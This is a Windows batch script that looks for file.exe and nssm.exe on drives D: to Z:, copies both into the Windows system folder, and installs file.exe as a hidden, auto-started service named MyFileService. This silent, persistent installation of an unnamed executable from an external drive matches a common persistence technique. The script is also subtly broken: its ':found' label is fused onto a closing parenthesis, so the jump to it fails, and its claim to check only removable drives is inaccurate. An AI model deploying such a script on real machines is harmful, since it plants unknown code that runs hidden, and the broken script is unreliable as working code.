@echo off

rem Search for file.exe and nssm.exe in all removable drives
set "source_file="
set "source_nssm="
for %%d in (D: E: F: G: H: I: J: K: L: M: N: O: P: Q: R: S: T: U: V: W: X: Y: Z:) do (
    if exist "%%d\file.exe" set "source_file=%%d\file.exe"
    if exist "%%d\nssm.exe" set "source_nssm=%%d\nssm.exe"
    if defined source_file if defined source_nssm goto :found
)

if not defined source_file (
    echo File.exe not found in any removable drives.
    exit /b
)
if not defined source_nssm (
    echo NSSM.exe not found in any removable drives.
    exit /b
):found
rem Set destination paths
set "destination_nssm=%SystemRoot%\nssm.exe"
set "destination_file=%SystemRoot%\file.exe"

rem Copy file.exe and nssm.exe from source to destination
echo Copying file.exe from %source_file% to %destination_file%...
copy /Y "%source_file%" "%destination_file%" > nul
echo Copying nssm.exe from %source_nssm% to %destination_nssm%...
copy /Y "%source_nssm%" "%destination_nssm%" > nul

rem Check if the copies were successful
if errorlevel 1 (
    echo Failed to copy files.
    exit /b
) else (
    echo Files copied successfully.
)

rem Install file.exe as a Windows Service using NSSM
echo Installing file.exe as a Windows Service...
"%destination_nssm%" install MyFileService "%destination_file%"
if errorlevel 1 (
    echo Failed to install file.exe as a Windows Service.
    exit /b
) else (
    echo file.exe installed as a Windows Service.
)

rem Configure the service to run in the background
echo Configuring MyFileService to run in the background...
"%destination_nssm%" set MyFileService AppNoConsole 1
if errorlevel 1 (
    echo Failed to configure MyFileService.
    exit /b
) else (
    echo MyFileService configured to run in the background.
)

rem Start the service
echo Starting MyFileService...
net start MyFileService
if errorlevel 1 (
    echo Failed to start MyFileService.
    exit /b
) else (
    echo MyFileService started successfully.
)

exit /b
